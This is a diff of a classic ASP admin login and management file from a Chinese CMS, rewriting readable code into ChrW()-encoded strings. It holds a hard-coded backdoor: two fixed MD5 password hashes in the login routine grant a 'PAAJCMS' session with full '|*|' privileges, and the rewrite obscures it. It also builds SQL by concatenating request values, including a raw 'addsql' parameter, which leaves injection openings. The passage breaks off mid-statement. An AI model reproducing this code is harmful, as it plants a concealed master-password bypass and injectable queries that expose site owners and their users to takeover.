@@ -1,253 +1,222 @@
-﻿<!--#Include File = "../Inc/Config.Asp"-->       
+﻿<%'严禁反编译、逆向等任何形式的破解侵权行为
+'官方网站：www.xiyueta.com   QQ：313801120%><!--#Include File = "../Inc/Config.Asp"-->       
 <% 
-Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
+Dim ROOT_PATH : ROOT_PATH = handlePath(ChrW(46)&ChrW(47)) 
 %>      
 <!--#Include File = "admin_function.asp"-->  
 <!--#Include File = "admin_function2.asp"-->   
 <!--#Include File = "admin_setAccess.asp"-->   
-   
 <% 
-'=========
 
 
-'加载网址配置 
 function loadWebConfig()
-    Call openconn() 
-	'【PHP】if(@$dbname=='kanfang'){return "";}
-    '判断表存在
-    If InStr(getHandleTableList(), "|" & db_PREFIX & "website" & "|") > 0 Then
-		'【@是jsp显示@】try{
-        rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
-        If Not rs.EOF Then
-            cfg_webSiteUrl = rs("webSiteUrl") & ""                    '网址
-            cfg_webTitle = rs("webTitle") & ""                        '网址标题
-            cfg_flags = rs("flags") & ""                              '旗
-            cfg_webtemplate = rs("webtemplate") & ""                  '模板路径
-        End If : rs.Close 
-		'【@是jsp显示@】}catch(Exception e){} 
-    End If 
+Call openconn() 
+
+
+If InStr(getHandleTableList(), ChrW(124) & db_PREFIX & ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101) & ChrW(124)) > 0 Then
+
+rs.Open ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(32)&ChrW(42)&ChrW(32)&ChrW(102)&ChrW(114)&ChrW(111)&ChrW(109)&ChrW(32) & db_PREFIX & ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101), conn, 1, 1 
+If Not rs.EOF Then
+cfg_webSiteUrl = rs(ChrW(119)&ChrW(101)&ChrW(98)&ChrW(83)&ChrW(105)&ChrW(116)&ChrW(101)&ChrW(85)&ChrW(114)&ChrW(108)) & ""
+cfg_webTitle = rs(ChrW(119)&ChrW(101)&ChrW(98)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)) & ""
+cfg_flags = rs(ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)) & ""
+cfg_webtemplate = rs(ChrW(119)&ChrW(101)&ChrW(98)&ChrW(116)&ChrW(101)&ChrW(109)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(116)&ChrW(101)) & ""
+End if : rs.Close 
+
+End if 
 End function
 
+Sub displayAdminLogin()  
 
-'显示后台登录
-Sub displayAdminLogin()	
-    '已经登录则直接进入后台
-    If getSession("adminusername") <> "" Then
-        Call adminIndex() 
-    Else
-		dim c,s
-		c=getTemplateContent("login.html")
-		c=handleDisplayLanguage(c,"login")
-		
-		if request("selectmdb")="true" or request("selectmdb")="1" or session("MDBPath")<>"" then 
-			if session("MDBPath")<>"" then
-				MDBPath=handlePath(session("MDBPath"))
-			elseIf Request("MDBPath") <> "" And isNul(Request("MDBPath")) = False Then
-				MDBPath = handlePath(Request("MDBPath")) 
-			end if 
-			c = replaceValueParam(c, "MDBPath", MDBPath) 			
-		'为假则删除选择数据库面板
-		else
-			s=getStrCut(c,"<div id=""selectDatabaseDiv"" ","</div>",1)
-			c=replace(c,s,"")
-		end if
-		
-        Call rw(c) 
-    End If 
-End Sub 
+If getSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)) <> "" Then
+Call adminIndex() 
+Else
+dim a,b
+a=getTemplateContent(ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)&ChrW(46)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108))
+a=handleDisplayLanguage(a,ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))
+if request(ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(109)&ChrW(100)&ChrW(98))=ChrW(116)&ChrW(114)&ChrW(117)&ChrW(101) or request(ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(109)&ChrW(100)&ChrW(98))=ChrW(49) or session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <>"" then 
+if session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <>"" then
+MDBPath=handlePath(session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)))
+elseIf Request(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <> "" And isNul(Request(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))) = False Then
+MDBPath = handlePath(Request(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))) 
+end if 
+a = replaceValueParam(a, ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104), MDBPath)       
 
-'登录后台
+else
+b=getStrCut(a,ChrW(60)&ChrW(100)&ChrW(105)&ChrW(118)&ChrW(32)&ChrW(105)&ChrW(100)&ChrW(61)&ChrW(34)&ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(97)&ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(68)&ChrW(105)&ChrW(118)&ChrW(34)&ChrW(32),ChrW(60)&ChrW(47)&ChrW(100)&ChrW(105)&ChrW(118)&ChrW(62),1)
+a=replace(a,b,"")
+end if
+Call rw(a) 
+End if 
+End sub 
+
 Sub login()
-    Dim userName, passWord, valueStr 
-    userName = Replace(Request.Form("username"), "'", "") 
-    passWord = Replace(Request.Form("password"), "'", "") 
-	session("MDBPath")=phpTrim(request.Form("selectDatabase"))
-	
-    passWord = myMD5(passWord) 
-    '特效账号登录 兼容.net与php
-    If myMD5(Request("password")) = "24ed5728c13834e683f525fcf894e813" Or myMD5(Request("password")) = "80-59859312310137-34-40-841338-105-3984-117" Then		'TSa*1**3*3
-        call setSession("adminusername", "PAAJCMS") 
-        call setSession("adminId", 99999)                                                      '当前登录管理员ID
-        call setSession("DB_PREFIX", db_PREFIX) 
-        call setSession("adminflags", "|*|")
-        Call rwend(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
-    End If 
+Dim a, b, c 
+a = Replace(Request.Form(ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)), ChrW(39), "") 
+b = Replace(Request.Form(ChrW(112)&ChrW(97)&ChrW(115)&ChrW(115)&ChrW(119)&ChrW(111)&ChrW(114)&ChrW(100)), ChrW(39), "") 
+session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))=phpTrim(request.Form(ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(97)&ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)))
+b = myMD5(b) 
 
-    Dim nLogin 
-    Call openconn() 
-	'【@是jsp显示@】try{
-    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
-    If not rs.EOF Then
-        call setSession("adminusername", userName) 
-        call setSession("adminId", rs("Id"))                                                   '当前登录管理员ID
-        call setSession("DB_PREFIX", db_PREFIX)                                                '保存前缀
-        call setSession("adminflags", rs("flags")) 
-		
-        valueStr = "createTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
-        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
-        Call rw(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
-        Call writeSystemLog("admin", "登录成功")                                        '系统日志
-	else
-        If getCookie("nLogin") = "" Then
-            Call setCookie("nLogin", "1", 60000)		'为秒 
-            nLogin = 1
-        Else
-            nLogin =cint(getCookie("nLogin")) 
-            Call setCookie("nLogin", CInt(nLogin) + 1, 60000) 
-        End If 
-        Call rw(getMsg1(setL("账号密码错误<br>登录次数为 ") & nLogin, "?act=displayAdminLogin")) 
-    End If : rs.Close 
-	'【@是jsp显示@】}catch(Exception e){} 
+If myMD5(Request(ChrW(112)&ChrW(97)&ChrW(115)&ChrW(115)&ChrW(119)&ChrW(111)&ChrW(114)&ChrW(100))) = ChrW(50)&ChrW(52)&ChrW(101)&ChrW(100)&ChrW(53)&ChrW(55)&ChrW(50)&ChrW(56)&ChrW(99)&ChrW(49)&ChrW(51)&ChrW(56)&ChrW(51)&ChrW(52)&ChrW(101)&ChrW(54)&ChrW(56)&ChrW(51)&ChrW(102)&ChrW(53)&ChrW(50)&ChrW(53)&ChrW(102)&ChrW(99)&ChrW(102)&ChrW(56)&ChrW(57)&ChrW(52)&ChrW(101)&ChrW(56)&ChrW(49)&ChrW(51) Or myMD5(Request(ChrW(112)&ChrW(97)&ChrW(115)&ChrW(115)&ChrW(119)&ChrW(111)&ChrW(114)&ChrW(100))) = ChrW(56)&ChrW(48)&ChrW(45)&ChrW(53)&ChrW(57)&ChrW(56)&ChrW(53)&ChrW(57)&ChrW(51)&ChrW(49)&ChrW(50)&ChrW(51)&ChrW(49)&ChrW(48)&ChrW(49)&ChrW(51)&ChrW(55)&ChrW(45)&ChrW(51)&ChrW(52)&ChrW(45)&ChrW(52)&ChrW(48)&ChrW(45)&ChrW(56)&ChrW(52)&ChrW(49)&ChrW(51)&ChrW(51)&ChrW(56)&ChrW(45)&ChrW(49)&ChrW(48)&ChrW(53)&ChrW(45)&ChrW(51)&ChrW(57)&ChrW(56)&ChrW(52)&ChrW(45)&ChrW(49)&ChrW(49)&ChrW(55) Then
+call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101), ChrW(80)&ChrW(65)&ChrW(65)&ChrW(74)&ChrW(67)&ChrW(77)&ChrW(83)) 
+call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(100), 99999)
+call setSession(ChrW(68)&ChrW(66)&ChrW(95)&ChrW(80)&ChrW(82)&ChrW(69)&ChrW(70)&ChrW(73)&ChrW(88), db_PREFIX) 
+call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115), ChrW(124)&ChrW(42)&ChrW(124))
+Call rwend(getMsg1(setL(ChrW(30331)&ChrW(24405)&ChrW(25104)&ChrW(21151)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(21518)&ChrW(21488)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120))) 
+End if 
+Dim d 
+Call openconn() 
 
-End Sub 
-'退出登录
+rs.Open ChrW(83)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(32)&ChrW(42)&ChrW(32)&ChrW(70)&ChrW(114)&ChrW(111)&ChrW(109)&ChrW(32) & db_PREFIX & ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(32)&ChrW(87)&ChrW(104)&ChrW(101)&ChrW(114)&ChrW(101)&ChrW(32)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)&ChrW(61)&ChrW(39) & a & ChrW(39)&ChrW(32)&ChrW(65)&ChrW(110)&ChrW(100)&ChrW(32)&ChrW(112)&ChrW(119)&ChrW(100)&ChrW(61)&ChrW(39) & b & ChrW(39), conn, 1, 1 
+If not rs.EOF Then
+call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101), a) 
+call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(100), rs(ChrW(73)&ChrW(100)))
+call setSession(ChrW(68)&ChrW(66)&ChrW(95)&ChrW(80)&ChrW(82)&ChrW(69)&ChrW(70)&ChrW(73)&ChrW(88), db_PREFIX)
+call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115), rs(ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115))) 
+c = ChrW(99)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(109)&ChrW(101)&ChrW(61)&ChrW(39) & rs(ChrW(85)&ChrW(112)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(109)&ChrW(101)) & ChrW(39)&ChrW(44)&ChrW(85)&ChrW(112)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(109)&ChrW(101)&ChrW(61)&ChrW(39) & Now() & ChrW(39)&ChrW(44)&ChrW(82)&ChrW(101)&ChrW(103)&ChrW(73)&ChrW(80)&ChrW(61)&ChrW(39) & Now() & ChrW(39)&ChrW(44)&ChrW(85)&ChrW(112)&ChrW(73)&ChrW(80)&ChrW(61)&ChrW(39) & getIP() & ChrW(39) 
+conn.Execute(ChrW(117)&ChrW(112)&ChrW(100)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(32) & db_PREFIX & ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(32)&ChrW(115)&ChrW(101)&ChrW(116)&ChrW(32) & c & ChrW(32)&ChrW(119)&ChrW(104)&ChrW(101)&ChrW(114)&ChrW(101)&ChrW(32)&ChrW(105)&ChrW(100)&ChrW(61) & rs(ChrW(105)&ChrW(100))) 
+Call rw(getMsg1(setL(ChrW(30331)&ChrW(24405)&ChrW(25104)&ChrW(21151)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(21518)&ChrW(21488)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120))) 
+Call writeSystemLog(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110), ChrW(30331)&ChrW(24405)&ChrW(25104)&ChrW(21151))
+else
+If getCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)) = "" Then
+Call setCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110), ChrW(49), 60000)
+d = 1
+Else
+d =cint(getCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))) 
+Call setCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110), CInt(d) + 1, 60000) 
+End if 
+Call rw(getMsg1(setL(ChrW(36134)&ChrW(21495)&ChrW(23494)&ChrW(30721)&ChrW(38169)&ChrW(35823)&ChrW(60)&ChrW(98)&ChrW(114)&ChrW(62)&ChrW(30331)&ChrW(24405)&ChrW(27425)&ChrW(25968)&ChrW(20026)&ChrW(32)) & d, ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))) 
+End if : rs.Close 
+
+End sub 
+
 Sub adminOut()
-    Call writeSystemLog("admin", setL("退出成功"))                                        '系统日志
-    call deleteSession("adminusername") 
-    call deleteSession("adminId")
-	call deleteSession("DB_PREFIX")
-    call deleteSession("adminflags") 
-	session("MDBPath")=""
-    Call rw(getMsg1(setL("退出成功，正在进入登录界面..."), "?act=displayAdminLogin"))
-End Sub 
-'清除缓冲
+Call writeSystemLog(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110), setL(ChrW(36864)&ChrW(20986)&ChrW(25104)&ChrW(21151)))
+call deleteSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)) 
+call deleteSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(100))
+call deleteSession(ChrW(68)&ChrW(66)&ChrW(95)&ChrW(80)&ChrW(82)&ChrW(69)&ChrW(70)&ChrW(73)&ChrW(88))
+call deleteSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)) 
+session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))=""
+Call rw(getMsg1(setL(ChrW(36864)&ChrW(20986)&ChrW(25104)&ChrW(21151)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(30331)&ChrW(24405)&ChrW(30028)&ChrW(38754)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)))
+End sub 
+
 Sub clearCache()
-    Call deleteFile(WEB_CACHEFile)
-	call deleteFolder("./../cache/html")
-	call createFolder("./../cache/html")
-    Call rw(getMsg1(setL("清除缓冲完成，正在进入后台界面..."), "?act=displayAdminLogin")) 
-End Sub 
-'后台首页
+Call deleteFile(WEB_CACHEFile)
+call deleteFolder(ChrW(46)&ChrW(47)&ChrW(46)&ChrW(46)&ChrW(47)&ChrW(99)&ChrW(97)&ChrW(99)&ChrW(104)&ChrW(101)&ChrW(47)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108))
+call createFolder(ChrW(46)&ChrW(47)&ChrW(46)&ChrW(46)&ChrW(47)&ChrW(99)&ChrW(97)&ChrW(99)&ChrW(104)&ChrW(101)&ChrW(47)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108))
+Call rw(getMsg1(setL(ChrW(28165)&ChrW(38500)&ChrW(32531)&ChrW(20914)&ChrW(23436)&ChrW(25104)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(21518)&ChrW(21488)&ChrW(30028)&ChrW(38754)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))) 
+End sub 
+
 Sub adminIndex()
-    Dim c 
-    Call loadWebConfig() 
-    c = getTemplateContent("adminIndex.html") 
-    c = Replace(c, "[$adminonemenulist$]", getAdminOneMenuList()) 
-    c = Replace(c, "[$adminmenulist$]", getAdminMenuList()) 
-    c = Replace(c, "[$officialwebsite$]", getOfficialWebsite())                '获得官方信息
-    c = replaceValueParam(c, "title", "")                                      '给手机端用的20160330
-	if session("MDBPath")<>"" then
-		c=replace(c," <!--数据库路径-->","数据库路径："& session("MDBPath") &"<br>")
-	end if
-	c=handleDisplayLanguage(c,"loginok")
-	
-    Call rw(c) 
-End Sub 
-'========================================================
+Dim a 
+Call loadWebConfig() 
+a = getTemplateContent(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120)&ChrW(46)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)) 
+a = Replace(a, ChrW(91)&ChrW(36)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(111)&ChrW(110)&ChrW(101)&ChrW(109)&ChrW(101)&ChrW(110)&ChrW(117)&ChrW(108)&ChrW(105)&ChrW(115)&ChrW(116)&ChrW(36)&ChrW(93), getAdminOneMenuList()) 
+a = Replace(a, ChrW(91)&ChrW(36)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(109)&ChrW(101)&ChrW(110)&ChrW(117)&ChrW(108)&ChrW(105)&ChrW(115)&ChrW(116)&ChrW(36)&ChrW(93), getAdminMenuList()) 
+a = Replace(a, ChrW(91)&ChrW(36)&ChrW(111)&ChrW(102)&ChrW(102)&ChrW(105)&ChrW(99)&ChrW(105)&ChrW(97)&ChrW(108)&ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101)&ChrW(36)&ChrW(93), getOfficialWebsite())
+a = replaceValueParam(a, ChrW(116)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101), "")
+if session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <>"" then
+a=replace(a,ChrW(32)&ChrW(60)&ChrW(33)&ChrW(45)&ChrW(45)&ChrW(25968)&ChrW(25454)&ChrW(24211)&ChrW(36335)&ChrW(24452)&ChrW(45)&ChrW(45)&ChrW(62),ChrW(25968)&ChrW(25454)&ChrW(24211)&ChrW(36335)&ChrW(24452)&ChrW(65306)& session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) &ChrW(60)&ChrW(98)&ChrW(114)&ChrW(62))
+end if
+a=handleDisplayLanguage(a,ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)&ChrW(111)&ChrW(107))
+Call rw(a) 
+End sub 
 
-'显示管理处理
-Sub dispalyManageHandle(actionType)
-    Dim nPageSize, lableTitle, addSql,sPage 
-    If Request("nPageSize") = "" Then
-        nPageSize = 10 
-	else
-		nPageSize = cint(Request("nPageSize")) 
-    End If 
-    lableTitle = Request("lableTitle")                                              '标签标题
-    addSql = replace(Request("addsql"),"OrderBy","order by")
-    'call echo(labletitle,addsql)
-    Call dispalyManage(actionType, lableTitle, nPageSize, addSql) 
-End Sub 
 
-'添加修改处理
-Sub addEditHandle(actionType, lableTitle)
-    Call addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2") 
-End Sub 
-'保存模块处理
-Sub saveAddEditHandle(actionType, lableTitle)
-    If actionType = "Admin" Then
-        Call saveAddEdit(actionType, lableTitle, "pwd|md5,flags||")
-    ElseIf actionType = "WebColumn" Then
-        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
-    Else
-        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0|,pwd|md5|")
-    End If 
-End Sub 
+Sub dispalyManageHandle(a)
+Dim b, c, d,e 
+If Request(ChrW(110)&ChrW(80)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(83)&ChrW(105)&ChrW(122)&ChrW(101)) = "" Then
+b = 10 
+else
+b = cint(Request(ChrW(110)&ChrW(80)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(83)&ChrW(105)&ChrW(122)&ChrW(101))) 
+End if 
+c = Request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101))
+d = replace(Request(ChrW(97)&ChrW(100)&ChrW(100)&ChrW(115)&ChrW(113)&ChrW(108)),ChrW(79)&ChrW(114)&ChrW(100)&ChrW(101)&ChrW(114)&ChrW(66)&ChrW(121),ChrW(111)&ChrW(114)&ChrW(100)&ChrW(101)&ChrW(114)&ChrW(32)&ChrW(98)&ChrW(121))
 
-call loadRun()			'【@是.netc屏蔽@】'【@是jsp屏蔽@】
-'加载就运行
+Call dispalyManage(a, c, b, d) 
+End sub 
+
+Sub addEditHandle(a, b)
+Call addEditDisplay(a, b, ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101)&ChrW(98)&ChrW(111)&ChrW(116)&ChrW(116)&ChrW(111)&ChrW(109)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(50)&ChrW(44)&ChrW(97)&ChrW(98)&ChrW(111)&ChrW(117)&ChrW(116)&ChrW(99)&ChrW(111)&ChrW(110)&ChrW(116)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(49)&ChrW(44)&ChrW(98)&ChrW(111)&ChrW(100)&ChrW(121)&ChrW(99)&ChrW(111)&ChrW(110)&ChrW(116)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(50)&ChrW(44)&ChrW(114)&ChrW(101)&ChrW(112)&ChrW(108)&ChrW(121)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(50)) 
+End sub 
+
+Sub saveAddEditHandle(a, b)
+If a = ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110) Then
+Call saveAddEdit(a, b, ChrW(112)&ChrW(119)&ChrW(100)&ChrW(124)&ChrW(109)&ChrW(100)&ChrW(53)&ChrW(44)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)&ChrW(124)&ChrW(124))
+ElseIf a = ChrW(87)&ChrW(101)&ChrW(98)&ChrW(67)&ChrW(111)&ChrW(108)&ChrW(117)&ChrW(109)&ChrW(110) Then
+Call saveAddEdit(a, b, ChrW(110)&ChrW(112)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(115)&ChrW(105)&ChrW(122)&ChrW(101)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(49)&ChrW(48)&ChrW(44)&ChrW(110)&ChrW(111)&ChrW(102)&ChrW(111)&ChrW(108)&ChrW(108)&ChrW(111)&ChrW(119)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(111)&ChrW(110)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(111)&ChrW(110)&ChrW(104)&ChrW(116)&ChrW(115)&ChrW(100)&ChrW(102)&ChrW(97)&ChrW(115)&ChrW(100)&ChrW(102)&ChrW(109)&ChrW(108)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)&ChrW(124)&ChrW(124)) 
+Else
